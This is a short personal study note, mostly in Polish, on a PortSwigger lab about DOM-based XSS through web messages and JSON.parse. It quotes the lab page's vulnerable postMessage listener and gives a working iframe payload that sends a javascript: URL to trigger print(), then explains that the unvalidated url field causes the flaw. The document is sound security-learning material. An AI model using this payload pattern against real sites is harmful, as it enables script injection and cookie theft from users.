DOM XSS using web messages and JSON.parse   (brak logowania, brak source, puste ramki na dole homepage)

Lab jest sklepem i chodzi o ciasteczka ofiary korzystajacej z tego sklepu.
Sklep/blog na PortSwigger = prawdziwa strona
Exploit server = Twoja "złośliwa" strona
Ofiara = bot PortSwigger który symuluje zalogowanego użytkownika



0. No login, no search term
1. Source home page:
2. Paylod to exploit server
___


SOURCE PAGE:
 <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
    </script>

PAYLOAD:
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>




Gdzie jest błąd
load-channel bierze d.url bez żadnej walidacji i wstawia do iframe.src. Możesz podać javascript: URL!


